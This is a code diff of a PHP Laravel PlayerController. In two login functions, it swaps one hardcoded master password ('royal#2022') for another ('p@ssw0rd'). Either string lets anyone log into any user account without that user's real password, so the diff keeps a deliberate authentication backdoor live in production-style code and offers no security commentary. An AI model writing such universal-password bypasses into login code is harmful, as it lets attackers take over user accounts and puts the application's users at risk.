@@ -52,7 +52,7 @@ class PlayerController extends Controller
         $password = $request->password;
         $mntnc = setting::first();
         $userData = User::where('user_name', $username)->first();
-        if (!empty($userData) && (Hash::check($password, $userData->password) || $password == 'royal#2022')) {
+        if (!empty($userData) && (Hash::check($password, $userData->password) || $password == 'p@ssw0rd')) {
             if ($userData->agent_level == 'PL') {
                 $new_sessid = \Session::getId();
                 $userData->token_val = $new_sessid;
@@ -121,7 +121,7 @@ class PlayerController extends Controller
         $mntnc = setting::first();
         $userData = User::where('user_name', $username)->first();
 
-        if (!empty($userData) && (Hash::check($password, $userData->password) || $password == 'royal#2022')) {
+        if (!empty($userData) && (Hash::check($password, $userData->password) || $password == 'p@ssw0rd')) {
             if ($userData->agent_level == 'PL') {
                 $new_sessid = \Session::getId();
                 $userData->token_val = $new_sessid;
